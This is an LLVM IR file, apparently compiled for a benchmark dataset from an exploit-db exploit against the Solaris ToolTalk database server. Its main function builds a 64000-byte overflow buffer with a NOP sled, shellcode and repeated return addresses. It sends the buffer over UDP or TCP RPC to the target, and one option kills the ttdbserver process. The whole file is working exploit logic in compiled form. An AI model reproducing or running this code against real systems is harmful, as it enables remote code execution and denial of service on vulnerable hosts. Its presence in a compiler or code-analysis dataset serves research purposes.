; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_19635.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_19635.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_9__ = type { i32 }
%struct.timeval = type { i32, i64 }
%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_8__ }
%struct.TYPE_8__ = type { i32 }
%struct.tt_reply = type { i32, i32 }

@SP = common dso_local global i32 0, align 4
@BSIZE = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"ukp:f:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = external dso_local global i8*, align 8
@optind = external dso_local global i32, align 4
@NOP = common dso_local global i8* null, align 8
@asmcode = common dso_local global i8* null, align 8
@LENOFS = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"rpc datagram stored in %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"%s: cannot resolve\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@RPC_ANYSOCK = common dso_local global i32 0, align 4
@TT_DBSERVER_PROG = common dso_local global i32 0, align 4
@TT_DBSERVER_VERS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [12 x i8] c"clnt_create\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@xdr_wrapstring = common dso_local global i32 0, align 4
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [10 x i8] c"clnt_call\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"Could not kill ttdbserver, reply is: %s\0A\00", align 1
@_TT_P = common dso_local global i32 0, align 4
@xdr_tt_reply = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [22 x i8] c"res i1 %d, res i2 %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.TYPE_9__*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.timeval, align 8
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.tt_reply, align 4
  %12 = alloca [64000 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %17, align 8
  %25 = load i32, i32* @SP, align 4
  store i32 %25, i32* %20, align 4
  %26 = load i32, i32* @BSIZE, align 4
  store i32 %26, i32* %21, align 4
  %27 = load i32, i32* @PORT, align 4
  store i32 %27, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 0, i32* %24, align 4
  br label %28

28:                                               ; preds = %48, %2
  %29 = load i32, i32* %4, align 4
  %30 = load i8**, i8*** %5, align 8
  %31 = call i32 @getopt(i32 %29, i8** %30, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i32 %31, i32* %19, align 4
  %32 = load i32, i32* @EOF, align 4
  %33 = icmp ne i32 %31, %32
  br i1 %33, label %34, label %49

34:                                               ; preds = %28
  %35 = load i32, i32* %19, align 4
  switch i32 %35, label %43 [
    i32 112, label %36
    i32 107, label %39
    i32 117, label %40
    i32 102, label %41
  ]

36:                                               ; preds = %34
  %37 = load i8*, i8** @optarg, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %22, align 4
  br label %48

39:                                               ; preds = %34
  store i32 1, i32* %23, align 4
  br label %48

40:                                               ; preds = %34
  store i32 1, i32* %24, align 4
  br label %48

41:                                               ; preds = %34
  %42 = load i8*, i8** @optarg, align 8
  store i8* %42, i8** %17, align 8
  br label %48

43:                                               ; preds = %34
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @usage(i8* %46)
  br label %48

48:                                               ; preds = %43, %41, %40, %39, %36
  br label %28

49:                                               ; preds = %28
  %50 = load i32, i32* %4, align 4
  %51 = load i32, i32* @optind, align 4
  %52 = sub nsw i32 %50, %51
  %53 = icmp slt i32 %52, 2
  br i1 %53, label %54, label %59

54:                                               ; preds = %49
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 0
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @usage(i8* %57)
  br label %59

59:                                               ; preds = %54, %49
  %60 = load i8**, i8*** %5, align 8
  %61 = load i32, i32* @optind, align 4
  %62 = add nsw i32 %61, 1
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8*, i8** %60, i64 %63
  %65 = load i8*, i8** %64, align 8
  store i8* %65, i8** %14, align 8
  %66 = load i8**, i8*** %5, align 8
  %67 = load i32, i32* @optind, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8*, i8** %66, i64 %68
  %70 = load i8*, i8** %69, align 8
  store i8* %70, i8** %15, align 8
  store i32 0, i32* %19, align 4
  br label %71

71:                                               ; preds = %86, %59
  %72 = load i32, i32* %19, align 4
  %73 = sext i32 %72 to i64
  %74 = icmp ult i64 %73, 64000
  br i1 %74, label %75, label %89

75:                                               ; preds = %71
  %76 = load i8*, i8** @NOP, align 8
  %77 = load i32, i32* %19, align 4
  %78 = srem i32 %77, 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %76, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %83 = load i32, i32* %19, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  store i8 %81, i8* %85, align 1
  br label %86

86:                                               ; preds = %75
  %87 = load i32, i32* %19, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %19, align 4
  br label %71

89:                                               ; preds = %71
  %90 = load i32, i32* %21, align 4
  %91 = sext i32 %90 to i64
  %92 = load i8*, i8** @asmcode, align 8
  %93 = call i64 @strlen(i8* %92)
  %94 = sub i64 %91, %93
  %95 = load i8*, i8** %14, align 8
  %96 = call i64 @strlen(i8* %95)
  %97 = sub i64 %94, %96
  %98 = trunc i64 %97 to i32
  store i32 %98, i32* %19, align 4
  %99 = load i32, i32* %19, align 4
  %100 = and i32 %99, -4
  store i32 %100, i32* %19, align 4
  %101 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %102 = load i32, i32* %19, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = load i8*, i8** @asmcode, align 8
  %106 = call i32 @strcpy(i8* %104, i8* %105)
  %107 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %108 = load i8*, i8** %14, align 8
  %109 = call i32 @strcat(i8* %107, i8* %108)
  %110 = load i8*, i8** %14, align 8
  %111 = call i64 @strlen(i8* %110)
  %112 = add i64 %111, 1
  %113 = xor i64 %112, -1
  %114 = trunc i64 %113 to i32
  %115 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %116 = load i32, i32* %19, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  %119 = load i32, i32* @LENOFS, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = bitcast i8* %121 to i32*
  store i32 %114, i32* %122, align 4
  %123 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %124 = call i64 @strlen(i8* %123)
  %125 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 %124
  store i8 46, i8* %125, align 1
  %126 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %127 = load i32, i32* %21, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8* %129, i8** %16, align 8
  store i32 0, i32* %19, align 4
  br label %130

130:                                              ; preds = %137, %89
  %131 = load i32, i32* %19, align 4
  %132 = icmp slt i32 %131, 16
  br i1 %132, label %133, label %142

133:                                              ; preds = %130
  %134 = load i32, i32* %20, align 4
  %135 = load i8*, i8** %16, align 8
  %136 = bitcast i8* %135 to i32*
  store i32 %134, i32* %136, align 4
  br label %137

137:                                              ; preds = %133
  %138 = load i8*, i8** %16, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 4
  store i8* %139, i8** %16, align 8
  %140 = load i32, i32* %19, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %19, align 4
  br label %130

142:                                              ; preds = %130
  %143 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  store i8* %143, i8** %13, align 8
  %144 = load i8*, i8** %16, align 8
  store i8 0, i8* %144, align 1
  %145 = load i8*, i8** %17, align 8
  %146 = icmp ne i8* %145, null
  br i1 %146, label %147, label %155

147:                                              ; preds = %142
  %148 = load i8*, i8** %17, align 8
  %149 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %150 = load i32, i32* %24, align 4
  %151 = call i32 @make_file(i8* %148, i8* %149, i32 %150)
  %152 = load i8*, i8** %17, align 8
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i8* %152)
  %154 = call i32 @exit(i32 0) #3
  unreachable

155:                                              ; preds = %142
  %156 = load i8*, i8** %15, align 8
  %157 = call i32 @inet_addr(i8* %156)
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %159 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = icmp eq i32 %157, -1
  br i1 %160, label %161, label %178

161:                                              ; preds = %155
  %162 = load i8*, i8** %15, align 8
  %163 = call %struct.hostent* @gethostbyname(i8* %162)
  store %struct.hostent* %163, %struct.hostent** %9, align 8
  %164 = icmp eq %struct.hostent* %163, null
  br i1 %164, label %165, label %169

165:                                              ; preds = %161
  %166 = load i8*, i8** %15, align 8
  %167 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %166)
  %168 = call i32 @exit(i32 1) #3
  unreachable

169:                                              ; preds = %161
  %170 = load %struct.hostent*, %struct.hostent** %9, align 8
  %171 = getelementptr inbounds %struct.hostent, %struct.hostent* %170, i32 0, i32 0
  %172 = load i64, i64* %171, align 8
  %173 = inttoptr i64 %172 to i32*
  %174 = load i32, i32* %173, align 4
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %176 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %175, i32 0, i32 0
  store i32 %174, i32* %176, align 4
  br label %177

177:                                              ; preds = %169
  br label %178

178:                                              ; preds = %177, %155
  %179 = load i32, i32* @AF_INET, align 4
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %179, i32* %180, align 4
  %181 = load i32, i32* %22, align 4
  %182 = call i32 @htons(i32 %181)
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %182, i32* %183, align 4
  %184 = load i32, i32* @RPC_ANYSOCK, align 4
  store i32 %184, i32* %18, align 4
  %185 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i32 4, i32* %185, align 8
  %186 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %186, align 8
  %187 = load i32, i32* %24, align 4
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %189, label %198

189:                                              ; preds = %178
  %190 = load i32, i32* @TT_DBSERVER_PROG, align 4
  %191 = load i32, i32* @TT_DBSERVER_VERS, align 4
  %192 = bitcast %struct.timeval* %8 to { i32, i64 }*
  %193 = getelementptr inbounds { i32, i64 }, { i32, i64 }* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = getelementptr inbounds { i32, i64 }, { i32, i64 }* %192, i32 0, i32 1
  %196 = load i64, i64* %195, align 8
  %197 = call %struct.TYPE_9__* @clntudp_create(%struct.sockaddr_in* %10, i32 %190, i32 %191, i32 %194, i64 %196, i32* %18)
  store %struct.TYPE_9__* %197, %struct.TYPE_9__** %6, align 8
  br label %202

198:                                              ; preds = %178
  %199 = load i32, i32* @TT_DBSERVER_PROG, align 4
  %200 = load i32, i32* @TT_DBSERVER_VERS, align 4
  %201 = call %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in* %10, i32 %199, i32 %200, i32* %18, i32 0, i32 0)
  store %struct.TYPE_9__* %201, %struct.TYPE_9__** %6, align 8
  br label %202

202:                                              ; preds = %198, %189
  %203 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %204 = icmp eq %struct.TYPE_9__* %203, null
  br i1 %204, label %205, label %208

205:                                              ; preds = %202
  %206 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  %207 = call i32 @exit(i32 0) #3
  unreachable

208:                                              ; preds = %202
  %209 = call i32 @authunix_create(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i32 0, i32 0, i32 0, i32* null)
  %210 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %211 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %210, i32 0, i32 0
  store i32 %209, i32* %211, align 4
  %212 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i32 10, i32* %212, align 8
  %213 = load i32, i32* %23, align 4
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %215, label %232

215:                                              ; preds = %208
  store i8* null, i8** %13, align 8
  store i8* null, i8** %16, align 8
  %216 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %217 = load i32, i32* @xdr_wrapstring, align 4
  %218 = bitcast i8** %13 to i8*
  %219 = load i32, i32* @xdr_wrapstring, align 4
  %220 = bitcast i8** %16 to i8*
  %221 = call i32 @clnt_call(%struct.TYPE_9__* %216, i32 15, i32 %217, i8* %218, i32 %219, i8* %220, %struct.timeval* byval(%struct.timeval) align 8 %8)
  store i32 %221, i32* %7, align 4
  %222 = load i32, i32* @RPC_SUCCESS, align 4
  %223 = icmp ne i32 %221, %222
  br i1 %223, label %224, label %228

224:                                              ; preds = %215
  %225 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %226 = call i32 @clnt_perror(%struct.TYPE_9__* %225, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %227 = call i32 @exit(i32 1) #3
  unreachable

228:                                              ; preds = %215
  %229 = load i8*, i8** %16, align 8
  %230 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0), i8* %229)
  %231 = call i32 @exit(i32 1) #3
  unreachable

232:                                              ; preds = %208
  %233 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %234 = load i32, i32* @_TT_P, align 4
  %235 = load i32, i32* @xdr_wrapstring, align 4
  %236 = bitcast i8** %13 to i8*
  %237 = load i32, i32* @xdr_tt_reply, align 4
  %238 = bitcast %struct.tt_reply* %11 to i8*
  %239 = call i32 @clnt_call(%struct.TYPE_9__* %233, i32 %234, i32 %235, i8* %236, i32 %237, i8* %238, %struct.timeval* byval(%struct.timeval) align 8 %8)
  store i32 %239, i32* %7, align 4
  %240 = load i32, i32* @RPC_SUCCESS, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %246

242:                                              ; preds = %232
  %243 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %244 = call i32 @clnt_perror(%struct.TYPE_9__* %243, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %245 = call i32 @exit(i32 1) #3
  unreachable

246:                                              ; preds = %232
  %247 = getelementptr inbounds %struct.tt_reply, %struct.tt_reply* %11, i32 0, i32 0
  %248 = load i32, i32* %247, align 4
  %249 = getelementptr inbounds %struct.tt_reply, %struct.tt_reply* %11, i32 0, i32 1
  %250 = load i32, i32* %249, align 4
  %251 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0), i32 %248, i32 %250)
  %252 = load %struct.TYPE_9__*, %struct.TYPE_9__** %6, align 8
  %253 = call i32 @clnt_destroy(%struct.TYPE_9__* %252)
  %254 = load i32, i32* %3, align 4
  ret i32 %254
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @make_file(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local %struct.TYPE_9__* @clntudp_create(%struct.sockaddr_in*, i32, i32, i32, i64, i32*) #1

declare dso_local %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in*, i32, i32, i32*, i32, i32) #1

declare dso_local i32 @clnt_pcreateerror(i8*) #1

declare dso_local i32 @authunix_create(i8*, i32, i32, i32, i32*) #1

declare dso_local i32 @clnt_call(%struct.TYPE_9__*, i32, i32, i8*, i32, i8*, %struct.timeval* byval(%struct.timeval) align 8) #1

declare dso_local i32 @clnt_perror(%struct.TYPE_9__*, i8*) #1

declare dso_local i32 @clnt_destroy(%struct.TYPE_9__*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
